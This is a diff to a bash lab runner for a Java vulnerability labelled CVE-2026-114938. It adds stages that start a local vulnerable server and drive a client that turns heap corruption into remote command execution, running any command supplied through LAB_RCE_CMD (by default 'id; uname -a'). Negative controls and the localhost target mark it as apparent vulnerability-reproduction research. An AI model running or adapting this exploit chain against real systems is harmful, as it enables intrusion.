@@ -1,19 +1,22 @@
 #!/usr/bin/env bash
 # Java4Shell (CVE-2026-114938) lab runner.
 #
-# Usage: run-lab [trigger|control|corrupt|leak|write|all]
+# Usage: run-lab [trigger|control|corrupt|leak|write|rce|rce-control|all]
 #
-#   trigger  bounded, non-destructive OOB-write measurement
-#   control  same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
-#   corrupt  overwrite a neighbouring array's length + OOB read
-#   leak     JavaBleed-style heap disclosure (marker in a neighbour array)
-#   write    use the corrupted length for a chosen-value OOB write
-#   all      run all five (default)
+#   trigger      bounded, non-destructive OOB-write measurement
+#   control      same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
+#   corrupt      overwrite a neighbouring array's length + OOB read
+#   leak         JavaBleed-style heap disclosure (marker in a neighbour array)
+#   write        use the corrupted length for a chosen-value OOB write
+#   rce          controlled RCE: corruption -> OOB read -> command execution
+#   rce-control  same as rce, but with -XX:-UseBASE64Intrinsics (must not reproduce)
+#   all          run the five base stages (default)
 #
 # Environment:
 #   LAB_MODE=native|sde|auto   (default auto)
 #   LAB_WARMUP=N               (default 1000; use 200000 for a fully warm
 #                               decoder without -Xcomp on real hardware)
+#   LAB_RCE_CMD="..."          command the RCE client asks the target to run
 
 set -uo pipefail
 
@@ -25,6 +28,12 @@ SDE=/opt/sde/sde64
 
 JVM_OPTS=(-Xcomp -XX:-TieredCompilation)
 EXTRA_OPTS=()
+# JIT-only options for the controlled RCE stage: compile the Base64 decoder
+# (and only that) with C2, so the AVX-512 stub is generated without paying
+# the cost of compiling the whole HttpServer under SDE.
+RCE_OPTS=(-Xcomp -XX:-TieredCompilation \
+          -XX:+UnlockExperimentalVMOptions -XX:+UseEpsilonGC \
+          -Xms512m -Xmx512m)
 
 cpu_has_avx512() {
     # All four are required by the vulnerable decoder.
@@ -103,12 +112,71 @@ do_write() {
     run HeapWrite --warmup "$WARMUP"
 }
 
+rce_run() {
+    # $1 = mode label, $2 = extra JVM flags (space-free array passed via name)
+    local label="$1"
+    local extra_mode="$2"
+    local port=18080
+    local log="/tmp/rce-server-${label}.log"
+    : > "$log"
+
+    local -a opts=("${RCE_OPTS[@]}")
+    if [ "$extra_mode" = "control" ]; then
+        opts+=(-XX:-UseBASE64Intrinsics)
+    fi
+
+    banner "controlled RCE: ${label} (heap corruption -> OOB read -> exec)"
+    "${RUNNER[@]}" "${opts[@]}" -cp "$CLASSES" RceLab --port "$port" --warmup "$WARMUP" >>"$log" 2>&1 &
+    local pid=$!
+    cleanup() { kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; }
+    trap 'cleanup' RETURN INT TERM
+
+    local up=0
+    for i in $(seq 1 900); do
+        if curl -fsS "http://127.0.0.1:$port/health" >/dev/null 2>&1; then up=1; break; fi
+        if ! kill -0 "$pid" 2>/dev/null; then break; fi
+        sleep 1
+    done
+
+    if [ "$up" != 1 ]; then
+        echo "server failed to start (see $log)"
+        tail -40 "$log"
+        return 1
+    fi
+    echo "server ready (pid $pid)"
+
+    local rc=0
+    java -cp "$CLASSES" RceClient "http://127.0.0.1:$port" "${LAB_RCE_CMD:-${RCE_CMD:-id; uname -a}}" || rc=$?
+
+    # In control mode, the expected result is "no corruption", i.e. client exit 1.
+    if [ "$extra_mode" = "control" ]; then
+        if [ "$rc" = 1 ]; then
+            echo "[rce-control] OK: no RCE without the vulnerable intrinsic"
+            rc=0
+        fi
+    fi
+
+    cleanup
+    trap - RETURN INT TERM
+    return "$rc"
+}
+
+do_rce() {
+    rce_run "vulnerable" "vuln"
+}
+
+do_rce_control() {
+    rce_run "control" "control"
+}
+
 case "$TEST" in
     trigger) do_trigger ;;
     control) do_control ;;
     corrupt) do_corrupt ;;
     leak)    do_leak ;;
     write)   do_write ;;
+    rce)     do_rce ;;
+    rce-control) do_rce_control ;;
     all)
         do_trigger; echo "[trigger] exit=$?"
         do_control; echo "[control] exit=$?"
@@ -119,9 +187,12 @@ case "$TEST" in
         echo "Done. Expected: trigger=REPRODUCED, control=NOT REPRODUCED,"
         echo "corrupt=OOB READ REPRODUCED, leak=JAVA BLEED REPRODUCED,"
         echo "write=OOB WRITE REPRODUCED."
+        echo
+        echo "Optional: ./run.sh rce            (controlled RCE, ~3 min)"
+        echo "          ./run.sh rce-control    (negative control)"
         ;;
     *)
-        echo "usage: $0 [trigger|control|corrupt|leak|write|all]" >&2
+        echo "usage: $0 [trigger|control|corrupt|leak|write|rce|rce-control|all]" >&2
         exit 2
         ;;
 esac
